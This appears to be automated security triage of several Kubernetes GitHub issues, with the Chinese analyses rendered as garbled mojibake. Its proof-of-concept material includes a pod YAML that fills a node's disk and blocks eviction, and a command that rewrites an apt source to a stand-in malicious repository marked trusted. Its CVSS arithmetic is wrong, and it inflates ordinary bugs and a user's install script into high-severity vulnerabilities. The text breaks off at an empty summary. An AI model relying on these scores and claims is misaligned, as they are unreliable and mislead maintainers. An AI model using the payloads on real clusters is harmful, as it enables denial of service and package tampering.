**CVSS 3.1è¯„åˆ†ï¼š**

- **æ”»å‡»å‘é‡ï¼ˆAVï¼‰**ï¼šç½‘ç»œï¼ˆNï¼‰â€”â€”æ”»å‡»è€…å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®APIæ¥æ‰§è¡Œæ”»å‡»ã€‚
- **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰**ï¼šä½ï¼ˆLï¼‰â€”â€”ä¸éœ€è¦ç‰¹æ®Šçš„æ¡ä»¶å³å¯å®æ–½æ”»å‡»ã€‚
- **ç‰¹æƒè¦æ±‚ï¼ˆPRï¼‰**ï¼šä½ï¼ˆLï¼‰â€”â€”éœ€è¦å¯¹ç›®æ ‡é›†ç¾¤æœ‰ä¸€å®šçš„æƒé™ï¼Œå¦‚åˆ›å»ºæˆ–ä¿®æ”¹Podçš„æƒé™ã€‚
- **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰**ï¼šæ— ï¼ˆNï¼‰â€”â€”ä¸éœ€è¦å…¶ä»–ç”¨æˆ·çš„äº¤äº’ã€‚
- **ä½œç”¨èŒƒå›´ï¼ˆSï¼‰**ï¼šæœªæ”¹å˜ï¼ˆUï¼‰â€”â€”æ”»å‡»å½±å“åœ¨æƒé™èŒƒå›´å†…ã€‚
- **æœºå¯†æ€§ï¼ˆCï¼‰**ï¼šæ— ï¼ˆNï¼‰â€”â€”ä¸å½±å“æ•°æ®çš„ä¿å¯†æ€§ã€‚
- **å®Œæ•´æ€§ï¼ˆIï¼‰**ï¼šæ— ï¼ˆNï¼‰â€”â€”ä¸å½±å“æ•°æ®çš„å®Œæ•´æ€§ã€‚
- **å¯ç”¨æ€§ï¼ˆAï¼‰**ï¼šé«˜ï¼ˆHï¼‰â€”â€”ä¸¥é‡å½±å“æœåŠ¡çš„å¯ç”¨æ€§ã€‚

**ç»¼åˆè¯„åˆ†ï¼š**7.5ï¼ˆé«˜ï¼‰

**æ€»ç»“ï¼š**

è¯¥æ¼æ´æ»¡è¶³å¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œä¸”å¯èƒ½å¯¼è‡´é«˜ä¸¥é‡ç¨‹åº¦çš„å¯ç”¨æ€§å½±å“ï¼Œç¬¦åˆåˆ†é…CVEç¼–å·çš„æ¡ä»¶ï¼Œå»ºè®®å°½å¿«ä¿®å¤ã€‚

---

## Issue #123906 Issues with runtime handler supported feature lookup

- Issue é“¾æ¥ï¼š[#123906](https://github.com/kubernetes/kubernetes/issues/123906)

### Issue å†…å®¹

There were a couple changes to merged in v1.30 to guard user namespaces & recursive read only mounts based on runtime self-reported support. When looking through the code, I noticed the following issues:

1. Lookup is done by `runtimeClassName`, rather than `runtimeHandler`:
    - https://github.com/kubernetes/kubernetes/blob/634fc1b4836b3a500e0d715d71633ff67690526a/pkg/kubelet/kubelet_pods.go#L2453
    - https://github.com/kubernetes/kubernetes/blob/634fc1b4836b3a500e0d715d71633ff67690526a/pkg/kubelet/kuberuntime/util/util.go#L104-L107
    - Should be using `LookupRuntimeHandler` https://github.com/kubernetes/kubernetes/blob/634fc1b4836b3a500e0d715d71633ff67690526a/pkg/kubelet/runtimeclass/runtimeclass_manager.go#L61
2. Version skew is not handled in the case where the container runtime doesn't provide any RuntimeHandlers, which results in a lot of log spam:
    ```
    Mar 12 19:17:29 kind-control-plane kubelet[719]: E0312 19:17:29.342999     719 kubelet_pods.go:2464] "unknown runtime class" runtimeClassName=""
    Mar 12 19:17:29 kind-control-plane kubelet[719]: E0312 19:17:29.347115     719 kubelet_pods.go:2464] "unknown runtime class" runtimeClassName=""
    Mar 12 19:17:30 kind-control-plane kubelet[719]: E0312 19:17:30.286822     719 kubelet_pods.go:2464] "unknown runtime class" runtimeClassName=""
    Mar 12 19:17:30 kind-control-plane kubelet[719]: E0312 19:17:30.286858     719 kubelet_pods.go:2464] "unknown runtime class" runtimeClassName=""
    Mar 12 19:17:30 kind-control-plane kubelet[719]: E0312 19:17:30.286864     719 kubelet_pods.go:2464] "unknown runtime class" runtimeClassName=""
    ```

/assign @giuseppe @AkihiroSuda
/cc @haircommander 

/kind bug regression
/milestone v1.30
/sig node

### åˆ†æç»“æœ

è¯¥Issueæ¶‰åŠåˆ°Kubernetesä¸­`RuntimeClass`çš„æŸ¥æ‰¾é€»è¾‘å­˜åœ¨é—®é¢˜ï¼Œå¯èƒ½å¯¼è‡´å®‰å…¨é£é™©ã€‚

**åŸå› åˆ†æï¼š**

1. **æŸ¥æ‰¾æ–¹å¼é”™è¯¯ï¼š**  
   ä»£ç ä¸­ä½¿ç”¨äº†`runtimeClassName`è¿›è¡ŒæŸ¥æ‰¾ï¼Œè€Œä¸æ˜¯ä½¿ç”¨`runtimeHandler`ã€‚å…·ä½“è€Œè¨€ï¼Œ`kubelet_pods.go`ä¸­çš„æŸ¥æ‰¾å‡½æ•°ä½¿ç”¨äº†`pod.Spec.RuntimeClassName`ï¼Œè€Œä¸æ˜¯`RuntimeClass.Handler`ã€‚

2. **ç‰ˆæœ¬åå·®å¤„ç†ä¸å½“ï¼š**  
   å½“å®¹å™¨è¿è¡Œæ—¶æœªæä¾›ä»»ä½•`RuntimeHandlers`æ—¶ï¼Œæ²¡æœ‰å¦¥å–„å¤„ç†ç‰ˆæœ¬ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå¯¼è‡´æ—¥å¿—ä¸­å¤§é‡æŠ¥é”™ã€‚

**å¯èƒ½çš„å®‰å…¨å½±å“ï¼š**

- **å®‰å…¨ç‰¹æ€§å¤±æ•ˆï¼š**  
  å¦‚æœKubeletæ— æ³•æ­£ç¡®è§£æ`RuntimeClass`ï¼Œå¯èƒ½ä¼šé»˜è®¤ä½¿ç”¨ä¸å®‰å…¨çš„è¿è¡Œæ—¶é…ç½®ã€‚ä¾‹å¦‚ï¼Œé¢„æœŸå¯ç”¨çš„ç”¨æˆ·å‘½åç©ºé—´éš”ç¦»ï¼ˆUser Namespacesï¼‰æˆ–åªè¯»æŒ‚è½½ï¼ˆRecursive Read-Only Mountsï¼‰å¯èƒ½æœªè¢«åº”ç”¨ã€‚

- **æ”»å‡»é¢å¢åŠ ï¼š**  
  æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ï¼Œæäº¤åŒ…å«ç‰¹å®š`runtimeClassName`çš„Podï¼Œè¯±ä½¿Kubeletåº”ç”¨é”™è¯¯çš„è¿è¡Œæ—¶é…ç½®ï¼Œä»è€Œç»•è¿‡å®‰å…¨é™åˆ¶ã€‚

- **æƒé™æå‡å’Œéš”ç¦»çªç ´ï¼š**  
  ç”±äºå®¹å™¨æœªæ­£ç¡®åº”ç”¨å®‰å…¨ç‰¹æ€§ï¼Œæ”»å‡»è€…å¯èƒ½è·å–æ›´é«˜æƒé™ï¼Œå½±å“å®¿ä¸»æœºæˆ–å…¶ä»–å®¹å™¨çš„å®‰å…¨ã€‚

**ç¬¦åˆé£é™©åˆ¤æ–­æ ‡å‡†ï¼š**

1. **å¯è¢«æ”»å‡»è€…åˆ©ç”¨ï¼š**  
   æ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤ç‰¹åˆ¶çš„Podè§„èŒƒï¼Œåˆ©ç”¨è¯¥æŸ¥æ‰¾é€»è¾‘é”™è¯¯ã€‚

2. **å¯èƒ½æˆä¸ºæ¼æ´å¹¶è·å¾—CVEç¼–å·ï¼ŒCVSSè¯„åˆ†é«˜äº7.0ï¼š**  
   - **æ”»å‡»å‘é‡ï¼ˆAVï¼‰ï¼šç½‘ç»œï¼ˆNï¼‰**
   - **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰ï¼šä½ï¼ˆLï¼‰**
   - **æ‰€éœ€æƒé™ï¼ˆPRï¼‰ï¼šä½ï¼ˆLï¼‰**
   - **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰ï¼šæ— ï¼ˆNï¼‰**
   - **å½±å“èŒƒå›´ï¼šå½±å“å¤šä¸ªç»„ä»¶ï¼ˆCï¼‰ã€å®Œæ•´æ€§ï¼ˆIï¼‰å’Œå¯ç”¨æ€§ï¼ˆAï¼‰çš†å—å½±å“**

   åˆæ­¥ä¼°è®¡ï¼ŒCVSS 3.1è¯„åˆ†åœ¨7.0ä»¥ä¸Šï¼Œå±äºé«˜å±çº§åˆ«ã€‚

**Proof of Conceptï¼ˆæ¦‚å¿µéªŒè¯ï¼‰ï¼š**

1. **æ”»å‡»è€…æäº¤æ¶æ„Podï¼š**

   ```yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: exploit-pod
   spec:
     runtimeClassName: ""
     containers:
     - name: exploit-container
       image: alpine
       command: ["sh", "-c", "id; sleep 3600"]
   ```

   åœ¨è¯¥Podè§„èŒƒä¸­ï¼Œ`runtimeClassName`è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸²æˆ–ä¸€ä¸ªä¸å­˜åœ¨çš„å€¼ã€‚

2. **é¢„æœŸä¸å®é™…ç»“æœï¼š**
   - *é¢„æœŸç»“æœï¼š* Podåº”åº”ç”¨é»˜è®¤çš„å®‰å…¨è¿è¡Œæ—¶é…ç½®ï¼Œå¯ç”¨æ‰€æœ‰é¢„æœŸçš„å®‰å…¨ç‰¹æ€§ã€‚
   - *å®é™…ç»“æœï¼š* ç”±äºæŸ¥æ‰¾`RuntimeClass`å¤±è´¥ï¼ŒKubeletå¯èƒ½æœªèƒ½åº”ç”¨å¿…è¦çš„å®‰å…¨ç‰¹æ€§ï¼Œå¯¼è‡´å®¹å™¨ä»¥ä¸å®‰å…¨çš„æ–¹å¼è¿è¡Œã€‚

3. **éªŒè¯å®‰å…¨ç‰¹æ€§æ˜¯å¦å¤±æ•ˆï¼š**
   - è¿›å…¥å®¹å™¨å†…éƒ¨ï¼Œæ£€æŸ¥æ˜¯å¦å…·æœ‰æ›´é«˜æƒé™ï¼Œä¾‹å¦‚æ˜¯å¦ä¸ºrootç”¨æˆ·ã€‚
   - å°è¯•è®¿é—®å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿæˆ–å…¶ä»–å®¹å™¨çš„èµ„æºã€‚

**ç»“è®ºï¼š**

è¯¥Issueå­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨æ¥ç»•è¿‡å®¹å™¨çš„å®‰å…¨é™åˆ¶ï¼Œé€ æˆæƒé™æå‡å’Œéš”ç¦»çªç ´ç­‰å®‰å…¨é—®é¢˜ã€‚å»ºè®®å¼€å‘å›¢é˜Ÿå°½å¿«ä¿®å¤è¯¥é—®é¢˜ï¼Œç¡®ä¿`RuntimeClass`çš„æŸ¥æ‰¾é€»è¾‘æ­£ç¡®ï¼Œé˜²æ­¢å®‰å…¨ç‰¹æ€§å¤±æ•ˆã€‚

---

## Issue #123872 Soft eviction of pods with long grace periods blocks hard evictions when under resource pressure

- Issue é“¾æ¥ï¼š[#123872](https://github.com/kubernetes/kubernetes/issues/123872)

### Issue å†…å®¹

#### What happened?

When kubelet detects that it's under resource pressure, it first attempts to do soft evictions, until the hard eviction threshold is reached. When a pod is soft-evicted, it respects the configured max pod grace period seconds, and until the pod has shut down, kubelet will not attempt to soft OR hard evict another pod, even if the hard eviction threshold is reached.

As a result, one pod taking a long time to shut down can cause kubelet to run out of resources. From [this comment](https://github.com/kubernetes/kubernetes/blob/016d8b11ae250ca933fe83de312bbe7c4945cd20/pkg/kubelet/eviction/eviction_manager.go#L405) and [this comment](https://github.com/kubernetes/kubernetes/blob/016d8b11ae250ca933fe83de312bbe7c4945cd20/pkg/kubelet/eviction/eviction_manager.go#L603) this behavior seems to be by design

In our case, we saw one soft eviction take 7 hours to complete, and meanwhile, resources usage kept climbing without any automation trying to save the node. Had other pods gotten soft evicted while this pod shut down, this would not be an issue. Manual intervention prevented it from reaching hard-eviction thresholds, but had that not happened, this would have entirely exhausted the node with no automated action

#### What did you expect to happen?

I would expect that kubelet would keep trying to soft evict other pods if one is taking a long time to shut down. Or at the very least, start hard evicting pods if the hard eviction threshold is reached. It could also hard-evict the pod that was soft-evicted but is taking a long time to shut down.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create two pods that get scheduled to the same node that have emptyDir volumes and a prestop hook that just sleeps forever
1. Start filling up those emptyDir volumes with `dd` until soft eviction threshold is reached
1. Watch as kubelet soft-evicts one pod
1. Continue filling up the emptyDir volumes with `dd`
1. Kubelet will not evict (hard or soft) even as the resource is totally exhausted

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.27.11
Kustomize Version: v5.0.1
Server Version: v1.27.11
```

</details>


#### Cloud provider

<details>
aws
</details>


#### OS version

<details>

AlmaLinux9/CentOS Stream 8

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
cri-o 1.27.0 and containerd 1.6.21 (we use a mix of both)
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**åŸå› ï¼š**

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨ï¼š** æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªå…·æœ‰é•¿å…³é—­æ—¶é—´çš„Podï¼ˆä¾‹å¦‚åœ¨preStop hookä¸­æ— é™æœŸåœ°sleepï¼‰ï¼Œå½“èŠ‚ç‚¹è¿›å…¥èµ„æºå‹åŠ›çŠ¶æ€æ—¶ï¼Œkubeletä¼šå°è¯•è½¯é©±é€è¯¥Podã€‚ä½†æ˜¯ç”±äºè¯¥Podéœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½å…³é—­ï¼Œkubeletåœ¨æ­¤æœŸé—´ä¸ä¼šå†å°è¯•é©±é€å…¶ä»–Podï¼Œå³ä½¿è¾¾åˆ°ç¡¬é©±é€é˜ˆå€¼ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æœºåˆ¶é˜»æ­¢kubeleté©±é€å…¶ä»–Podï¼Œä»è€Œè€—å°½èŠ‚ç‚¹èµ„æºã€‚

2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœåœ¨highä»¥ä¸Šï¼š**

   **CVSS 3.1è¯„åˆ†ï¼š**

   - **æ”»å‡»å‘é‡ï¼ˆAVï¼‰**ï¼šç½‘ç»œï¼ˆNï¼‰
   - **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰**ï¼šä½ï¼ˆLï¼‰
   - **æƒé™è¦æ±‚ï¼ˆPRï¼‰**ï¼šä½ï¼ˆLï¼‰
   - **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰**ï¼šæ— ï¼ˆNï¼‰
   - **ä½œç”¨åŸŸï¼ˆSï¼‰**ï¼šæœªæ”¹å˜ï¼ˆUï¼‰
   - **æœºå¯†æ€§å½±å“ï¼ˆCï¼‰**ï¼šæ— ï¼ˆNï¼‰
   - **å®Œæ•´æ€§å½±å“ï¼ˆIï¼‰**ï¼šæ— ï¼ˆNï¼‰
   - **å¯ç”¨æ€§å½±å“ï¼ˆAï¼‰**ï¼šé«˜ï¼ˆHï¼‰

   **è®¡ç®—ï¼š**

   - **å½±å“ï¼ˆImpactï¼‰**ï¼š
     \[
     å½±å“ = 6.42 \times [1 - (1 - C) \times (1 - I) \times (1 - A)] = 6.42 \times [1 - (1 - 0) \times (1 - 0) \times (1 - 0.56)] = 6.42 \times 0.56 = 3.59
     \]

   - **å¯åˆ©ç”¨æ€§ï¼ˆExploitabilityï¼‰**ï¼š
     \[
     å¯åˆ©ç”¨æ€§ = 8.22 \times AV \times AC \times PR \times UI = 8.22 \times 0.85 \times 1.0 \times 0.62 \times 1.0 = 4.33
     \]

   - **åŸºç¡€åˆ†æ•°ï¼ˆBase Scoreï¼‰**ï¼š
     \[
     åŸºç¡€åˆ†æ•° = \text{Min}[(å½±å“ + å¯åˆ©ç”¨æ€§), 10] = \text{Min}[3.59 + 4.33, 10] = 7.92
     \]

   æ ¹æ®CVSSè¯„åˆ†ï¼ŒåŸºç¡€åˆ†æ•°ä¸º7.9ï¼Œå±äºé«˜å±çº§åˆ«ã€‚

**å¯èƒ½çš„å½±å“ï¼š**

- **æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼š** æ”»å‡»è€…å¯ä»¥é€šè¿‡é˜»æ­¢kubeleté©±é€å…¶ä»–Podï¼Œå¯¼è‡´èŠ‚ç‚¹èµ„æºï¼ˆå¦‚å†…å­˜ã€ç£ç›˜ï¼‰è€—å°½ï¼Œå½±å“é›†ç¾¤çš„å¯ç”¨æ€§ï¼Œå¯¼è‡´åˆæ³•æœåŠ¡æ— æ³•æ­£å¸¸è¿è¡Œã€‚

**Proof of Conceptï¼š**

1. **åˆ›å»ºå…·æœ‰é•¿ç»ˆæ­¢æ—¶é—´çš„Podï¼š**

   æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªPodï¼Œé…ç½®ä¸€ä¸ª`preStop` hookï¼Œåœ¨å…¶ä¸­æ‰§è¡Œ`sleep infinity`ï¼Œä½¿å¾—è¯¥Podåœ¨æ¥æ”¶åˆ°ç»ˆæ­¢ä¿¡å·åä¸ä¼šç«‹å³é€€å‡ºã€‚

   ```yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: malicious-pod
   spec:
     containers:
     - name: attacker
       image: alpine
       command: ["sh", "-c", "while true; do dd if=/dev/zero of=/emptydir/fill bs=1M count=10; done"]
       volumeMounts:
       - name: emptydir
         mountPath: /emptydir
       lifecycle:
         preStop:
           exec:
             command: ["sh", "-c", "sleep infinity"]
     volumes:
     - name: emptydir
       emptyDir: {}
   ```

2. **æ¶ˆè€—èŠ‚ç‚¹èµ„æºï¼š**

   Podçš„å®¹å™¨æŒç»­å‘`emptyDir`å·å†™å…¥æ•°æ®ï¼Œå¡«æ»¡ç£ç›˜ç©ºé—´ï¼Œå¢åŠ èŠ‚ç‚¹èµ„æºå‹åŠ›ã€‚

3. **è§¦å‘è½¯é©±é€ï¼š**

   å½“èŠ‚ç‚¹çš„èµ„æºä½¿ç”¨è¾¾åˆ°è½¯é©±é€é˜ˆå€¼æ—¶ï¼Œkubeletå°è¯•è½¯é©±é€è¯¥Podï¼Œä½†ç”±äº`preStop` hookä¸­çš„æ— é™`sleep`ï¼ŒPodä¸ä¼šç«‹å³ç»ˆæ­¢ã€‚

4. **é˜»æ­¢è¿›ä¸€æ­¥çš„é©±é€ï¼š**

   åœ¨è¯¥Podç»ˆæ­¢ä¹‹å‰ï¼Œkubeletä¸ä¼šé©±é€å…¶ä»–Podï¼Œå³ä½¿èµ„æºä½¿ç”¨è¾¾åˆ°ç¡¬é©±é€é˜ˆå€¼ã€‚æ”»å‡»è€…åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œé˜»æ­¢kubeletæ¸…ç†èµ„æºã€‚

5. **å¯¼è‡´æœåŠ¡ä¸­æ–­ï¼š**

   å…¶ä»–å…³é”®æœåŠ¡æ‰€åœ¨çš„Podå¯èƒ½å› ä¸ºèµ„æºè€—å°½è€Œæ— æ³•è°ƒåº¦æˆ–è¿è¡Œï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

**æ€»ç»“ï¼š**

è¯¥é—®é¢˜å…è®¸æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒæ„é€ çš„Podé˜»æ­¢kubeletåœ¨èµ„æºç´§å¼ æ—¶æ­£ç¡®é©±é€Podï¼Œå¯¼è‡´èŠ‚ç‚¹èµ„æºè€—å°½ï¼Œå½±å“æœåŠ¡å¯ç”¨æ€§ï¼Œå±äºé«˜å±å®‰å…¨é£é™©ã€‚

---

## Issue #123867 Not able to install kubectl,kubelet and kubeadm in kubernates

- Issue é“¾æ¥ï¼š[#123867](https://github.com/kubernetes/kubernetes/issues/123867)

### Issue å†…å®¹

#### What happened?

Trying to create a cluster by using kubeadm.
 scripts used :

**sudo apt update
sudo apt-get install -y apt-transport-https ca-certificates curl
curl -L https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key --keyring /usr/share/keyrings/cloud.google.gpg add
sudo touch /etc/apt/sources.list.d/kubernetes.list
sudo chmod 666 /etc/apt/sources.list.d/kubernetes.list
sudo echo deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://apt.kubernetes.io/ kubernetes-xenial main | tee /etc/apt/sources.list.d/kubernetes.list
sudo apt-get update
sudo apt-get install -y kubelet kubeadm kubectl**


#### What did you expect to happen?

It should create cluster but i am getting the following exception.

deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://apt.kubernetes.io/ kubernetes-xenial main
Hit:1 http://ap-south-1.ec2.archive.ubuntu.com/ubuntu focal InRelease
Hit:2 http://ap-south-1.ec2.archive.ubuntu.com/ubuntu focal-updates InRelease
Hit:3 http://ap-south-1.ec2.archive.ubuntu.com/ubuntu focal-backports InRelease
Hit:4 http://security.ubuntu.com/ubuntu focal-security InRelease
Ign:5 https://packages.cloud.google.com/apt kubernetes-xenial InRelease
Err:6 https://packages.cloud.google.com/apt kubernetes-xenial Release
  404  Not Found [IP: 142.251.42.110 443]
Reading package lists... Done
E: The repository 'https://apt.kubernetes.io kubernetes-xenial Release' does not have a Release file.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.
Reading package lists... Done
Building dependency tree
Reading state information... Done
E: Unable to locate package kubelet
E: Unable to locate package kubeadm
E: Unable to locate package kubectl


#### How can we reproduce it (as minimally and precisely as possible)?

use the above script to reproduce

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>

taking the latest version

#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
 ubuntu


#### Install tools

<details>


```
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

æ‚¨æä¾›çš„è„šæœ¬ä¸­å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œå…·ä½“åŸå› å¦‚ä¸‹ï¼š

### é£é™©åˆ†æ

åœ¨æ‚¨çš„è„šæœ¬ä¸­ï¼Œæœ‰ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
sudo chmod 666 /etc/apt/sources.list.d/kubernetes.list
```

è¿™æ¡å‘½ä»¤å°† `/etc/apt/sources.list.d/kubernetes.list` æ–‡ä»¶çš„æƒé™è®¾ç½®ä¸ºå…¨å±€å¯è¯»å†™ï¼ˆå³ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è¯»å–å’Œä¿®æ”¹è¯¥æ–‡ä»¶ï¼‰ã€‚è¿™ä¼šå¯¼è‡´ä»¥ä¸‹å®‰å…¨é—®é¢˜ï¼š

1. **éç‰¹æƒç”¨æˆ·å¯ç¯¡æ”¹è½¯ä»¶æº**ï¼šä»»ä½•ç³»ç»Ÿä¸Šçš„ç”¨æˆ·éƒ½å¯ä»¥ä¿®æ”¹ Kubernetes çš„è½¯ä»¶æºé…ç½®ï¼ŒæŒ‡å‘æ¶æ„çš„ä»“åº“æˆ–åŒ…ã€‚

2. **å®‰è£…æ¶æ„è½¯ä»¶çš„é£é™©**ï¼šå¦‚æœè½¯ä»¶æºè¢«ç¯¡æ”¹ï¼Œç³»ç»Ÿç®¡ç†å‘˜åœ¨æ‰§è¡Œ `sudo apt-get update` å’Œ `sudo apt-get install` æ—¶ï¼Œå¯èƒ½ä¼šä»æ¶æ„æºå®‰è£…è¢«æ¤å…¥åé—¨æˆ–æ¶æ„ä»£ç çš„è½¯ä»¶ã€‚

3. **ç³»ç»Ÿå®Œæ•´æ€§å—æŸ**ï¼šè½¯ä»¶æºçš„ç¯¡æ”¹å¯èƒ½å¯¼è‡´ç³»ç»Ÿè½¯ä»¶æ›´æ–°è¢«åŠ«æŒï¼Œå½±å“ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚

### æ»¡è¶³é£é™©åˆ¤æ–­æ ‡å‡†

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ˜¯çš„ï¼Œæ”»å‡»è€…ï¼ˆæœ¬åœ°éç‰¹æƒç”¨æˆ·ï¼‰å¯ä»¥åˆ©ç”¨æ­¤æƒé™ç¯¡æ”¹è½¯ä»¶æºï¼Œè¯±ä½¿ç®¡ç†å‘˜å®‰è£…æ¶æ„è½¯ä»¶ã€‚

2. **è¯¥é£é™©å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é… CVE ç¼–å·ï¼Œä½¿ç”¨ CVSS 3.1 è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœåœ¨ High ä»¥ä¸Š**ï¼š

   - **æ”»å‡»å‘é‡ï¼ˆAVï¼‰**ï¼šæœ¬åœ°ï¼ˆLï¼‰
   - **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰**ï¼šä½ï¼ˆLï¼‰
   - **æƒé™è¦æ±‚ï¼ˆPRï¼‰**ï¼šä½ï¼ˆLï¼‰
   - **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰**ï¼šéœ€è¦ï¼ˆRï¼‰
   - **å½±å“èŒƒå›´ï¼ˆSï¼‰**ï¼šæœªæ”¹å˜ï¼ˆUï¼‰
   - **æœºå¯†æ€§å½±å“ï¼ˆCï¼‰**ï¼šé«˜ï¼ˆHï¼‰
   - **å®Œæ•´æ€§å½±å“ï¼ˆIï¼‰**ï¼šé«˜ï¼ˆHï¼‰
   - **å¯ç”¨æ€§å½±å“ï¼ˆAï¼‰**ï¼šé«˜ï¼ˆHï¼‰

   ç»¼åˆè¯„åˆ†åœ¨ **7.8ï¼ˆHighï¼‰** ä»¥ä¸Šï¼Œç¬¦åˆé«˜å±æ¼æ´æ ‡å‡†ã€‚

### å¯èƒ½çš„å½±å“

- **æƒé™æå‡**ï¼šæ”»å‡»è€…å¯ä»¥è¯±å¯¼ç®¡ç†å‘˜å®‰è£…æ¶æ„è½¯ä»¶ï¼Œå®ç°æƒé™æå‡ã€‚
- **æ•°æ®æ³„éœ²æˆ–ç ´å**ï¼šæ¶æ„è½¯ä»¶å¯èƒ½çªƒå–ã€ç¯¡æ”¹æˆ–ç ´åç³»ç»Ÿæ•°æ®ã€‚
- **æŒä¹…åŒ–æ§åˆ¶**ï¼šæ”»å‡»è€…å¯èƒ½åœ¨ç³»ç»Ÿä¸­å»ºç«‹æŒä¹…åŒ–çš„åé—¨è®¿é—®ã€‚

### æ¦‚å¿µéªŒè¯ï¼ˆProof of Conceptï¼‰

1. **æ”»å‡»è€…æŸ¥çœ‹æ–‡ä»¶æƒé™**ï¼š

   ```bash
   ls -l /etc/apt/sources.list.d/kubernetes.list
   ```

   è¾“å‡ºï¼š

   ```
   -rw-rw-rw- 1 root root 1234 æ—¥æœŸ /etc/apt/sources.list.d/kubernetes.list
   ```

2. **æ”»å‡»è€…ç¯¡æ”¹è½¯ä»¶æº**ï¼š

   ```bash
   echo 'deb [trusted=yes] http://æ¶æ„åœ°å€/ kubernetes-xenial main' > /etc/apt/sources.list.d/kubernetes.list
   ```

3. **ç®¡ç†å‘˜æ‰§è¡Œæ›´æ–°å’Œå®‰è£…å‘½ä»¤**ï¼š

   ```bash
   sudo apt-get update
   sudo apt-get install -y kubelet kubeadm kubectl
   ```

   ç®¡ç†å‘˜å¯èƒ½åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å®‰è£…äº†æ¥è‡ªæ¶æ„æºçš„è½¯ä»¶ã€‚

### å»ºè®®æªæ–½

- **ä¸è¦æ›´æ”¹è½¯ä»¶æºæ–‡ä»¶çš„æƒé™**ï¼šåº”ä¿æŒ `/etc/apt/sources.list.d/kubernetes.list` çš„é»˜è®¤æƒé™ï¼ˆé€šå¸¸ä¸º `-rw-r--r--`ï¼‰ï¼Œåªæœ‰ root ç”¨æˆ·å¯ä»¥ä¿®æ”¹ã€‚

- **ä½¿ç”¨æ­£ç¡®çš„æ–‡ä»¶å†™å…¥æ–¹å¼**ï¼šå¦‚æœéœ€è¦æ·»åŠ å†…å®¹ï¼Œå¯ä½¿ç”¨ `sudo tee` å‘½ä»¤ï¼Œè€Œæ— éœ€æ›´æ”¹æ–‡ä»¶æƒé™ã€‚ä¾‹å¦‚ï¼š

  ```bash
  echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee /etc/apt/sources.list.d/kubernetes.list
  ```

- **ç¡®ä¿å¯†é’¥çš„å®‰å…¨æ€§**ï¼šå¯¼å…¥çš„ GPG å¯†é’¥åº”æ¥è‡ªå¯ä¿¡æ¥æºï¼Œå¹¶ç¡®ä¿ä¼ è¾“è¿‡ç¨‹çš„å®‰å…¨ã€‚

- **é™åˆ¶æœ¬åœ°ç”¨æˆ·æƒé™**ï¼šé¿å…åœ¨ç³»ç»Ÿä¸Šåˆ›å»ºä¸å¿…è¦çš„æœ¬åœ°ç”¨æˆ·ï¼Œå®šæœŸæ£€æŸ¥æ–‡ä»¶æƒé™ï¼Œé˜²èŒƒå†…éƒ¨å¨èƒã€‚

### æ€»ç»“

